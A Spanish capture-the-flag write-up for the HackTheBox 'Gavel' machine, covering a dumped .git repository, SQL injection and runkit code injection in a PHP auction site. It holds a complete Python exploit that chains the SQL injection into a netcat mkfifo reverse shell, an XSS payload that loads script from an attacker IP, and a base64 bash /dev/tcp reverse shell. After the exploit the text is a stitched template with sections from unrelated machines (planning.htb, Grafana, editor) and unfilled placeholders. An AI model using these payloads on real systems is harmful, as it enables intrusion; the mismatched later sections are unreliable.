
# Gavel

<figure><img src="/files/wSsQXIIElhaOnI1hP1ue" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Gavel`
* **IP:** `10.10.11.97`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟡 Media`
* **Fecha:** `DD-MM-AAAA`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.97 gavel.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -sV -A -T5 10.10.11.97
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1f:de:9d:84:bf:a1:64:be:1f:36:4f:ac:3c:52:15:92 (ECDSA)
|_  256 70:a5:1a:53:df:d1:d0:73:3e:9d:90:ad:c1:aa:b4:19 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-git: 
|   10.10.11.97:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: .. 
|_http-favicon: Unknown favicon MD5: 954223287BC6EB88C5DD3C79083B91E1
|_http-title: Gavel Auction
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

Solo encontramos los puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

Algo curioso que encontramos es un repositorio git expuesto en el puerto 80, como nos muestra el escaneo de nmap:

```bash
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-git: 
|   10.10.11.97:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
```

#### Dumpeo del git expuesto <a href="#dumpeo-del-git-expuesto" id="dumpeo-del-git-expuesto"></a>

Seguramente este repositorio contenga credenciales o algún usuario expuesto

```bash
pip install git-dumper

git-dumper http://gavel.htb/.git /home/kali/Escritorio/machines/htb/gavel

[-] Testing http://gavel.htb/.git/HEAD [200]
[-] Testing http://gavel.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://gavel.htb/.gitignore [404]
[-] http://gavel.htb/.gitignore responded with status code 404
[-] Fetching http://gavel.htb/.git/ [200]
[-] Already downloaded http://gavel.htb/.git/COMMIT_EDITMSG
[-] Already downloaded http://gavel.htb/.git/HEAD
[-] Already downloaded http://gavel.htb/.git/config
[-] Already downloaded http://gavel.htb/.git/description
[-] Already downloaded http://gavel.htb/.git/index
[-] Fetching http://gavel.htb/.git/info/ [200]
[-] Fetching http://gavel.htb/.git/logs/ [200]
[-] Already downloaded http://gavel.htb/.git/logs/HEAD
[-] Already downloaded http://gavel.htb/.git/info/exclude
[-] Fetching http://gavel.htb/.git/refs/ [200]
[-] Fetching http://gavel.htb/.git/branches/ [200]
[-] Fetching http://gavel.htb/.git/hooks/ [200]
[-] Fetching http://gavel.htb/.git/logs/refs/ [200]
<---SNIP--->
[-] Fetching http://gavel.htb/.git/objects/f9/1ced156071ee558cc5fb4900f8ff3593efa865 [200]
[-] Fetching http://gavel.htb/.git/objects/fb/4310486dc5a755a082824c304fe25eb4b75f43 [200]
[-] Fetching http://gavel.htb/.git/objects/f9/25189481f8768cc9de1cb01aca6481e5baf4e4 [200]
[-] Fetching http://gavel.htb/.git/objects/f9/453eb0aa8bc066174fcd76aa9bc5ba19c2e5fe [200]
[-] Fetching http://gavel.htb/.git/objects/f9/856d16020471668f4627fbed3254114a8ca13c [200]
[-] Fetching http://gavel.htb/.git/objects/f9/c40f18d1c04ab8301f0c530da9372cdcccf892 [200]
[-] Fetching http://gavel.htb/.git/objects/f9/ca8d91cd30d6b0000d725c9b4c4601a6ec3274 [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Actualizadas 1849 rutas desde el índice
```

Ahora tenemos en nuestro Kali el repositorio completo:

```bash
ls -la
                              
drwxrwxr-x kali kali 4.0 KB Thu Dec  4 02:23:26 2025  .
drwxrwxr-x kali kali 4.0 KB Thu Dec  4 02:14:50 2025  ..
drwxrwxr-x kali kali 4.0 KB Thu Dec  4 02:23:27 2025  .git
.rwxrwxr-x kali kali 8.6 KB Thu Dec  4 02:23:25 2025  admin.php
drwxrwxr-x kali kali 4.0 KB Thu Dec  4 02:23:25 2025  assets
.rwxrwxr-x kali kali 8.2 KB Thu Dec  4 02:23:26 2025  bidding.php
drwxrwxr-x kali kali 4.0 KB Thu Dec  4 02:23:26 2025  includes
.rwxrwxr-x kali kali  14 KB Thu Dec  4 02:23:26 2025  index.php
.rwxrwxr-x kali kali 8.2 KB Thu Dec  4 02:23:26 2025  inventory.php
.rwxrwxr-x kali kali 6.3 KB Thu Dec  4 02:23:26 2025  login.php
.rwxrwxr-x kali kali 161 B  Thu Dec  4 02:23:26 2025  logout.php
.rwxrwxr-x kali kali 6.9 KB Thu Dec  4 02:23:26 2025  register.php
drwxrwxr-x kali kali 4.0 KB Thu Dec  4 02:23:26 2025  rules
```

En la ruta `/includes/config.php` encontramos credenciales para la base de datos con el usuario `gavel`:

```php
define('DB_HOST', 'localhost');
define('DB_NAME', 'gavel');
define('DB_USER', 'gavel');
define('DB_PASS', 'gavel');
```

### Acceso Web

Accedemos a `http://gavel.htb` y observamos que parece que es **una web ficticia, humorística y temática de fantasía**, presentada como una **casa de subastas de objetos mágicos y malditos** llamada **Gavel 2.0**.

<figure><img src="/files/TbVjn6fYkpz0hbjyhYEy" alt=""><figcaption></figcaption></figure>

Podemos registrarnos para ver el interior de esta web:

<figure><img src="/files/MUrvc0RORR836vN16YqH" alt=""><figcaption></figcaption></figure>

Al registrarnos vemos que hay 2 apartados nuevos, `Inventory` y `Bidding`:

<figure><img src="/files/vJ25qIlOq0ktuDo3m81t" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/IjU5oQKRc3QIAAKZY5JZ" alt=""><figcaption></figcaption></figure>

Parece que podemos hacer una puja por algunos objetos, y tenemos 50K monedas. Vamos a capturar una petición con BurpSuite:

<figure><img src="/files/Nae0vPnv3kV5AtPCwTHQ" alt=""><figcaption></figcaption></figure>

Observamos que nos devuelve una respuesta en JSON:

```json
{"success":true,"message":"Bid placed successfully!"}
```

Una vez ganada una puja aparecerá en Inventory:

<figure><img src="/files/L9m8qukgqasv0NFk8brY" alt=""><figcaption></figcaption></figure>

### Análisis de código

#### bidding.php

* Dependencias: Incluye config.php, db.php, session.php y auction.php. El archivo `auction.php` será muy importante.
* Lógica de pujas: Las pujas en sí se gestionan en `includes/bid_handler.php`.
* Pujas del lado del cliente: Las pujas se realizan a través de una solicitud fetch en JavaScript. Esto significa que la página no se recarga después de cada puja.
* Visualización de información: Muestra las subastas activas, incluyendo el nombre del artículo, la descripción, la imagen, el precio de salida, el precio actual, el mejor postor y el tiempo restante.
* Comentario interesante: La línea La puja es vinculante. En el caso de que otro participante supere su puja, o si presenta pujas superpuestas, el importe de su puja no será reembolsable. es muy interesante. Esto sugiere una posible vulnerabilidad en la que un usuario podría perder dinero aunque no gane la subasta. Se trata de un posible fallo lógico.

#### bid\_handler.php

* Vulnerabilidad: El código utiliza `runkit_function_add` para crear dinámicamente una función llamada `ruleCheck` a partir de la variable `$rule`, que se obtiene de la base de datos. Se trata de una vulnerabilidad clásica de inyección de código.

```php
try {
    if (function_exists('ruleCheck')) {
        runkit_function_remove('ruleCheck');
    }
    runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
    error_log("Rule: " . $rule);
    $allowed = ruleCheck($current_bid, $previous_bid, $bidder);
} catch (Throwable $e) {
    error_log("Rule error: " . $e->getMessage());
    $allowed = false;
}
```

* Extensión `runkit`: La extensión runkit es una extensión PECL que permite modificar funciones y clases de PHP en tiempo de ejecución. El hecho de que se utilice aquí es una enorme señal de alarma.

#### admin.php

* Autorización: Comprueba si el usuario ha iniciado sesión y tiene el rol de auctioneer.
* Funcionalidad: Permite a un subastador actualizar la rule y el message de una subasta.
* Vulnerabilidad: Esta es la pieza que faltaba en el rompecabezas. Un subastador puede controlar directamente la variable `$rule` que se utiliza en la llamada a `runkit_function_add` en `bid_handler.php`.

#### inventory.php

* Vulnerabilidad de inyección SQL:
  * `$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';`
  * `` $col = "" . str_replace("", "", $sortItem) . "";` ``
  * `$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");`

```php
$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "`" . str_replace("`", "", $sortItem) . "`";
$itemMap = [];
$itemMeta = $pdo->prepare("SELECT name, description, image FROM items WHERE name = ?");
try {
    if ($sortItem === 'quantity') {
        $stmt = $pdo->prepare("SELECT item_name, item_image, item_description, quantity FROM inventory WHERE user_id = ? ORDER BY quantity DESC");
        $stmt->execute([$userId]);
    } else {
        $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
        $stmt->execute([$userId]);
    }
```

La variable $sortItem se toma directamente de la entrada del usuario ($\_POST\['sort'] o $\_GET\['sort']) y no se sanea correctamente. La llamada a str\_replace sólo elimina las comillas invertidas, lo que no es suficiente para evitar la inyección de SQL. Se trata de una vulnerabilidad clásica de inyección de SQL.

## <mark style="color:purple;">Explotación</mark>

Usaremos el siguiente script que he creado específicamente para explotar esto:

{% code title="exploit.py" %}

```python
import requests
import sys

def login(session, url, username, password):
    """Logs in to the application and returns the session cookie."""
    login_url = f"{url}/login.php"
    data = {
        "username": username,
        "password": password
    }
    try:
        response = session.post(login_url, data=data, allow_redirects=False)
        response.raise_for_status()
        if "gavel_session" in session.cookies:
            print("[+] Login successful.")
            return session.cookies.get_dict()
        else:
            print("[-] Login failed. Check your credentials.")
            sys.exit(1)
    except requests.exceptions.RequestException as e:
        print(f"[-] An error occurred during login: {e}")
        sys.exit(1)

def escalate_privileges(session, url, user_id, cookies):
    """Escalates privileges to auctioneer using SQL injection."""
    print("[*] Attempting to escalate privileges...")
    injection_payload = f"item_name ; UPDATE users SET role = 'auctioneer' WHERE id = {user_id}; --"
    params = {
        "user_id": user_id,
        "sort": injection_payload
    }
    try:
        response = session.get(f"{url}/inventory.php", params=params, cookies=cookies)
        response.raise_for_status()
        print("[+] Privilege escalation payload sent.")
    except requests.exceptions.RequestException as e:
        print(f"[-] An error occurred during privilege escalation: {e}")
        sys.exit(1)

def update_rule(session, url, auction_id, reverse_shell_payload, cookies):
    """Updates the auction rule with the reverse shell payload."""
    print("[*] Updating auction rule...")
    data = {
        "auction_id": auction_id,
        "rule": reverse_shell_payload,
        "message": "pwned"
    }
    try:
        response = session.post(f"{url}/admin.php", data=data, cookies=cookies, allow_redirects=False)
        response.raise_for_status()
        if response.status_code == 302:
            print("[+] Auction rule updated successfully.")
        else:
            print("[-] Failed to update auction rule. Are you an auctioneer?")
            sys.exit(1)
    except requests.exceptions.RequestException as e:
        print(f"[-] An error occurred while updating the auction rule: {e}")
        sys.exit(1)

def trigger_shell(session, url, auction_id, cookies):
    """Triggers the reverse shell by placing a bid."""
    print("[*] Triggering reverse shell...")
    data = {
        "auction_id": (None, str(auction_id)),
        "bid_amount": (None, "1")
    }
    try:
        response = session.post(f"{url}/includes/bid_handler.php", files=data, cookies=cookies)
        response.raise_for_status()
        print("[+] Bid placed to trigger the shell. Check your listener.")
    except requests.exceptions.RequestException as e:
        print(f"[-] An error occurred while triggering the shell: {e}")
        sys.exit(1)

def main():
    """Main function to orchestrate the attack."""
    if len(sys.argv) != 6:
        print("Usage: python exploit.py <url> <user_id> <auction_id> <local_ip> <local_port>")
        print("Example: python exploit.py http://gavel.htb 2 418 10.10.14.12 4444")
        sys.exit(1)

    url = sys.argv[1]
    user_id = sys.argv[2]
    auction_id = sys.argv[3]
    local_ip = sys.argv[4]
    local_port = sys.argv[5]

    username = "afsh4ck"
    password = "afsh4ck123"

    reverse_shell_payload = f"return system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {local_ip} {local_port} >/tmp/f');"

    with requests.Session() as session:
        cookies = login(session, url, username, password)
        escalate_privileges(session, url, user_id, cookies)
        # After escalating privileges, we need to log in again to get the new session with the auctioneer role
        cookies = login(session, url, username, password)
        update_rule(session, url, auction_id, reverse_shell_payload, cookies)
        trigger_shell(session, url, auction_id, cookies)

if __name__ == "__main__":
    main()
```

{% endcode %}

Para usarlo, debes proporcionar los siguientes argumentos:

* : La URL de la aplicación Gavel (por ejemplo, <http://gavel.htb>).
* \<user\_id>: El ID de usuario de tu usuario en la aplicación.
* \<auction\_id>: El ID de la subasta que quieres modificar.
* \<local\_ip>: Tu dirección IP local para el shell inverso.
* \<local\_port>: El puerto en el que estás escuchando para el shell inverso.

```bash
python exploit.py http://gavel.htb 2 418 10.10.14.12 4444
```

Comandos útiles:

```bash
host gavel.htb
dig gavel.htb
curl -I http://gavel.htb
whatweb -a3 -v http://gavel.htb
netcat -vz gavel.htb 1-1000
```

***

## <mark style="color:purple;">Enumeración Web</mark>

### Testing de Formularios

* Probar inyecciones SQL y XSS:
  * `' OR '1'='1`
  * `<script>alert(1)</script>`
* Observar mensajes, errores, cambios de comportamiento
* Herramientas: Burp Suite, sqlmap, wfuzz

Probamos distintas técnicas de inyección SQL/XSS sin éxito.

### Fuzzing de Directorios

```bash
dirsearch -u http://planning.htb -x 404
```

```bash
gobuster dir -u http://planning.htb -w /usr/share/wordlists/dirb/common.txt
```

```bash
ffuf -u http://planning.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Directorios encontrados:**

* `/about.php`
* `/contact.php`
* `/js/` (403)
* `/lib/` (403)

No se encuentran datos sensibles directamente accesibles.

### Análisis de vulnerabilidades

```bash
nuclei -u planning.htb
```

***

## <mark style="color:purple;">Enumeración de Subdominios (VHosts)</mark>

#### Comprobación de Content-Length

```bash
curl -s -I http://10.10.11.68 -H "Host: defnotvalid.planning.htb" | grep "Content-Length:"

Content-Length: 178
```

#### Fuzzing con FFUF

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://10.10.11.68/ -H 'Host: FUZZ.planning.htb' -fs 178
```

**Encontramos el subdominio:** `grafana.planning.htb`

Lo añadimos a `/etc/hosts` y accedemos a un panel de Grafana v11.0.0.

***

## <mark style="color:purple;">Explotación</mark>

### Prueba de XSS (si hay forms)

Probaremos el siguiente script en los campos del formulario para ver si es vulnerable a Cross Site Scipting (XSS):

```javascript
 "><script src=http://10.10.14.15:9000/TESTING_THIS</script>
```

Cambiamos la IP por la nuestra y iniciamos un listener con `Netcat` en el puerto 9000. Hacemos clic en el botón `Send` y comprobamos si el listener recibe una llamada para confirmar la vulnerabilidad.

```shell-session
afsh4ck@kali$ nc -lvnp 9000
```

### Investigación de CVEs / Exploits

Exploramos CVEs relacionados con Grafana 11.0.0 en fuentes como:

* <https://sploitus.com>
* <https://exploit-db.com>
* <https://github.com>

**Exploit seleccionado:** *(Describir qué exploit se usó y su URL de referencia)*

### Ejecución del Exploit

Describir paso a paso cómo se logró la ejecución remota o el primer acceso.

### Estabilizar sesión

Usaremos Penelope para estabilizar nuestra sesión y tener persistencia:

{% embed url="<https://github.com/brightio/penelope>" %}

```bash
pipx install git+https://github.com/brightio/penelope

penelope
```

<figure><img src="/files/QFe2CD0y7qzQGRsfXtv4" alt=""><figcaption></figcaption></figure>

Usaremos el payload en bash de la sección `tun0`, ya que estamos conectados por VPN:

```bash
➤  tun0 → 10.10.15.3:4444

Bash TCP
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMy80NDQ0IDA+JjEpICY=|base64 -d|bash
```

Lo ejecutamos en la máquina objetivo:

```shell-session
nc -nlvp 4444  
listening on [any] 4444 ...
connect to [10.10.15.3] from (UNKNOWN) [10.10.11.92] 50602
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls
conversor.htb
$ printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMy80NDQ0IDA+JjEpICY=|base64 -d|bash
$ 
```

Y automáticamente recibimos la shell PTY con persistencia:

{% hint style="warning" %}
Con F12 podemos cerrar la sesión para interactuar con ella más tarde
{% endhint %}

<figure><img src="/files/oUGF21qJR5YQYE3Xk3kI" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Acceso Inicial</mark>

Una vez obtenido acceso:

* Verificar usuario actual (`whoami`)
* Verificar entorno (`uname -a`, `id`, `sudo -l`)

***

## <mark style="color:purple;">User Flag</mark>

Ubicación y obtención de la flag del usuario:

```bash
cat /home/<usuario>/user.txt
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No tenemos sudo como el usuario Oliver:

```shell-session
oliver@editor:/tmp$ sudo -l                                                        
[sudo] password for oliver: 
Sorry, user oliver may not run sudo on editor.
```

### Versión de SUDO

```shell-session
ike@expressway:~$ sudo -V
Sudo version 1.9.17
```

Esta versión de sudo es vulnerable al CVE-2025-32463, y encontramos varios PoC para explotarlo.

### Enumeración de archivos con permisos especiales

Buscando archivos con permisos especiales, encontré un archivo `ndsudo` sospechoso:

```shell-session
oliver@editor:/tmp$ find / -user root -perm -4000 -print 2>/dev/null

/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
```

### Ver servicios internos corriendo

```shell-session
oliver@editor:/tmp$ ss -tuln

Netid State   Recv-Q  Send-Q        Local Address:Port    Peer Address:Port Process 
udp   UNCONN  0       0                 127.0.0.1:8125         0.0.0.0:*            
udp   UNCONN  0       0             127.0.0.53%lo:53           0.0.0.0:*            
tcp   LISTEN  0       128                 0.0.0.0:22           0.0.0.0:*            
tcp   LISTEN  0       4096          127.0.0.53%lo:53           0.0.0.0:*            
tcp   LISTEN  0       511                 0.0.0.0:80           0.0.0.0:*            
tcp   LISTEN  0       151               127.0.0.1:3306         0.0.0.0:*            
tcp   LISTEN  0       4096              127.0.0.1:19999        0.0.0.0:*            
tcp   LISTEN  0       4096              127.0.0.1:8125         0.0.0.0:*            
tcp   LISTEN  0       4096              127.0.0.1:45249        0.0.0.0:*            
tcp   LISTEN  0       70                127.0.0.1:33060        0.0.0.0:*            
tcp   LISTEN  0       5                   0.0.0.0:8000         0.0.0.0:*            
tcp   LISTEN  0       128                    [::]:22              [::]:*            
tcp   LISTEN  0       511                    [::]:80              [::]:*            
tcp   LISTEN  0       50       [::ffff:127.0.0.1]:8079               *:*            
tcp   LISTEN  0       50                        *:8080               *:*   
```

Herramientas usadas:

* `sudo -l`
* `find / -perm -4000 2>/dev/null`
* `linpeas.sh`
* `pspy`

#### Técnica aplicada

Describir la técnica usada: binario con SUID, cronjob mal configurado, credenciales duras, etc.

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```bash
cat /root/root.txt
```
